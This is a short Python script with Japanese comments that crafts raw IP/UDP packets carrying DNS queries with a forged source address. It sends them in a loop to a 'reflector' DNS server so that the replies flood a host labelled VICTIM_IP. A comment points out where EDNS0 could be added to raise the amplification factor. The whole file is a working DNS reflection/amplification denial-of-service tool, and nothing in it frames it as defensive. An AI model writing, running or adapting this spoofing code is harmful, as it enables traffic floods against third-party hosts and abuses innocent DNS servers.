import socket
import struct
import sys

def checksum(msg):
  """IP/UDPヘッダー用のチェックサム計算"""
  s = 0
  # 2バイトずつ加算
  for i in range(0, len(msg), 2):
    if i + 1 < len(msg):
      w = (msg[i] << 8) + msg[i+1]
    else:
      w = (msg[i] << 8)
    s = s + w
  s = (s >> 16) + (s & 0xffff)
  s = s + (s >> 16)
  s = ~s & 0xffff
  return s

def build_dns_query(domain="example.com", tx_id=0x1234):
  """DNS Queryの構築 (EDNS0等を入れてアンプ倍率を上げる場合はここを拡張)"""
  header = struct.pack('>HHHHHH', tx_id, 0x0100, 1, 0, 0, 0)
  qname = b"".join(bytes([len(p)]) + p.encode('ascii') for p in domain.split(".")) + b"\x00"
  question = qname + struct.pack('>HH', 1, 1)  # Type A, Class IN
  return header + question

def send_spoof_dns_request(spoofed_src_ip, spoofed_src_port, target_dns_ip, target_dns_port=53, domain="example.com"):
  # 1. 生ソケットの作成 (IPヘッダー自作モード)
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
  except PermissionError:
    print("エラー: Raw Socketの使用には root/sudo 権限が必要です。")
    sys.exit(1)

  dns_payload = build_dns_query(domain)

  # 2. UDPヘッダーの構築 (8 bytes)
  udp_length = 8 + len(dns_payload)
  udp_checksum = 0
  # 一旦チェックサム0で仮組み
  udp_header = struct.pack('>HHHH', spoofed_src_port, target_dns_port, udp_length, udp_checksum)

  # UDP 疑似ヘッダー（チェックサム計算用）
  src_ip_bytes = socket.inet_aton(spoofed_src_ip)
  dst_ip_bytes = socket.inet_aton(target_dns_ip)
  placeholder = 0
  protocol = socket.IPPROTO_UDP
  pseudo_header = struct.pack('!4s4sBBH', src_ip_bytes, dst_ip_bytes, placeholder, protocol, udp_length)
  
  # UDPチェックサム計算
  udp_checksum = checksum(pseudo_header + udp_header + dns_payload)
  udp_header = struct.pack('>HHHH', spoofed_src_port, target_dns_port, udp_length, udp_checksum)

  # 3. IPヘッダーの構築 (20 bytes)
  ip_ihl = 5
  ip_ver = 4
  ip_tos = 0
  ip_tot_len = 20 + udp_length
  ip_id = 54321
  ip_frag_off = 0
  ip_ttl = 64
  ip_proto = socket.IPPROTO_UDP
  ip_check = 0  # OSが自動計算することが多いですが0で初期化

  ip_ihl_ver = (ip_ver << 4) + ip_ihl
  ip_header = struct.pack('!BBHHHBBH4s4s',
                          ip_ihl_ver, ip_tos, ip_tot_len, ip_id,
                          ip_frag_off, ip_ttl, ip_proto, ip_check,
                          src_ip_bytes, dst_ip_bytes)

  # パケット全体を結合
  packet = ip_header + udp_header + dns_payload

  # 4. 送信 (bind不要で、直接送り先に sendto)
  s.sendto(packet, (target_dns_ip, 0))
  print(f"送信完了: {spoofed_src_ip}:{spoofed_src_port} -> {target_dns_ip}:{target_dns_port}")

# 実行例
if __name__ == "__main__":
  VICTIM_IP = "192.168.1.15"
  VICTIM_PORT = 53
  REFLECTOR_DNS_IP = "192.168.1.12"  # 問い合わせ先のDNSキャッシュサーバー

  for i in range(100):
    send_spoof_dns_request(
        spoofed_src_ip=VICTIM_IP,
        spoofed_src_port=VICTIM_PORT,
        target_dns_ip=REFLECTOR_DNS_IP,
        domain="www.example1.test"
    )